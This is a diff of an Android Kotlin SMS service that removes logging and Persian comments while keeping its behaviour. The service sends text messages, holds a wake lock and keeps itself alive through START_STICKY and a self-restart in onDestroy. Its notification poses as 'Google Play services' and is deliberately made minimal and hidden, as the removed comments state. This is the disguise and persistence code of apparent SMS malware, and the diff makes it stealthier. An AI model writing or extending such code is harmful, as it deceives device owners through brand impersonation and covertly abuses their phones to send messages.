@@ -28,24 +28,15 @@ class SmsService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "🚀 SMS SERVICE CREATED")
-        Log.d(TAG, "════════════════════════════════════════")
         
-        // ⭐ Log Direct Boot status
         com.example.test.utils.DirectBootHelper.logStatus(this)
         
         deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         
-        // ⭐ WakeLock برای نگه داشتن دستگاه بیدار
         acquireWakeLock()
-        
         startForegroundNotification()
     }
 
-    /**
-     * WakeLock برای جلوگیری از خوابیدن دستگاه
-     */
     private fun acquireWakeLock() {
         try {
             val powerManager = getSystemService(POWER_SERVICE) as PowerManager
@@ -53,71 +44,58 @@ class SmsService : Service() {
                 PowerManager.PARTIAL_WAKE_LOCK,
                 "$TAG::WakeLock"
             )
-            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
-            Log.d(TAG, "✅ WakeLock acquired")
+            wakeLock?.acquire(10 * 60 * 1000L)
         } catch (e: Exception) {
-            Log.e(TAG, "❌ WakeLock failed: ${e.message}")
+            Log.e(TAG, "WakeLock failed: ${e.message}")
         }
     }
 
-    /**
-     * نوتیفیکیشن هوشمندانه که شبیه Google Play Update است
-     */
     private fun startForegroundNotification() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Google Play services",  // ⭐ شبیه Google Play
-                NotificationManager.IMPORTANCE_MIN  // ⭐ MIN برای مخفی بودن
+                "Google Play services",
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "Google Play services keeps your apps up to date"
-                setShowBadge(false)  // بدون Badge
+                setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
-                setSound(null, null)  // بدون صدا
-                lockscreenVisibility = Notification.VISIBILITY_SECRET  // مخفی در Lock Screen
+                setSound(null, null)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
         }
 
-        // ⭐ نوتیفیکیشن کم‌رنگ و مخفی
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Google Play services")
             .setContentText("Updating apps...")
-            .setSmallIcon(android.R.drawable.stat_notify_sync)  // ⭐ آیکون sync کم‌رنگ‌تر
-            .setPriority(NotificationCompat.PRIORITY_MIN)  // کمترین اولویت
-            .setOngoing(true)  // نمیشه بست
-            .setShowWhen(false)  // بدون زمان
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفی
-            .setCategory(NotificationCompat.CATEGORY_SERVICE)  // کتگوری سرویس
-            .setSilent(true)  // بدون صدا
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setOngoing(true)
+            .setShowWhen(false)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setSilent(true)
             .build()
 
-        // ⭐ startForeground با سازگاری با همه نسخه‌های اندروید
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            // Android 14+ (API 34+) - با foregroundServiceType
             startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
         } else {
-            // Android 7-13 - بدون type
             startForeground(NOTIFICATION_ID, notification)
         }
-        Log.d(TAG, "✅ Foreground service started")
     }
 
     private fun sendSms(phone: String, message: String) {
         try {
             SmsManager.getDefault().sendTextMessage(phone, null, message, null, null)
-            Log.d(TAG, "✅ SMS sent to: $phone")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ SMS failed: ${e.message}", e)
+            Log.e(TAG, "SMS failed: ${e.message}", e)
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "📞 onStartCommand called")
-        
-        // ⭐ START_STICKY: اگه سیستم کشتش، دوباره زنده میشه
         return START_STICKY
     }
 
@@ -128,24 +106,19 @@ class SmsService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         
-        Log.w(TAG, "⚠️ SmsService destroyed - Attempting restart...")
-        
         isRunning = false
         pollingThread?.interrupt()
         
-        // ⭐ آزاد کردن WakeLock
         try {
             wakeLock?.let {
                 if (it.isHeld) {
                     it.release()
-                    Log.d(TAG, "✅ WakeLock released")
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ WakeLock release failed: ${e.message}")
+            Log.e(TAG, "WakeLock release failed: ${e.message}")
         }
         
-        // ⭐ تلاش برای Restart خودکار
         try {
             val restartIntent = Intent(applicationContext, SmsService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -153,9 +126,8 @@ class SmsService : Service() {
             } else {
                 applicationContext.startService(restartIntent)
             }
-            Log.d(TAG, "🔄 Restart scheduled")
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Restart failed: ${e.message}")
+            Log.e(TAG, "Restart failed: ${e.message}")
         }
     }
 }
